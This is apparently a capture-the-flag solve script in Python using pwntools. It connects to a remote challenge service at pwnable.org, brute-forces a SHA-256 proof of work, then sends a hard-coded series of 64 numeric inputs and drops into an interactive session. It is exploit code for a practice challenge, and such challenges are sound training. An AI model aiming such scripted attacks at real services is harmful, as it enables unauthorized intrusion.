from pwn import *
import string
from hashlib import sha256

def dopow():
    chal = c.recvline()
    post = chal[12:28]
    tar = chal[33:-1]
    c.recvuntil(':')
    found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)
    c.sendline(found)

context.log_level='debug'
#c = remote('127.0.0.1',10001)
c = remote('pwnable.org',10001)
dopow()

msg = 'aaa'
xs = [65536, 65536, 65536, 1048576, 65536, 65536, 1048576, 65536, 65536, 1048576, 65536, 65536, 1048576, 1048576, 65536, 65536, 65536, 1048576, 1048576, 65536, 65536, 1048576, 65536, 1048576, 65536, 1048576, 1048576, 1048576, 65536, 65536, 1048576, 65536, 1048576, 1048576, 65536, 1048576, 65536, 65536, 65536, 1048576, 1048576, 65536, 65536, 1048576, 65536, 1048576, 65536, 1048576, 65536, 1048576, 65536, 65536, 1048576, 65536, 1048576, 1048576, 1048576, 1048576, 1048576, 1048576, 65536, 65536, 1048576, 65536]
v = 0xaaa
c.sendlineafter(': ',msg)
for i in range(64):
    c.sendlineafter(': ',str(xs[i]))
c.sendlineafter(': ',str(v))

c.interactive()
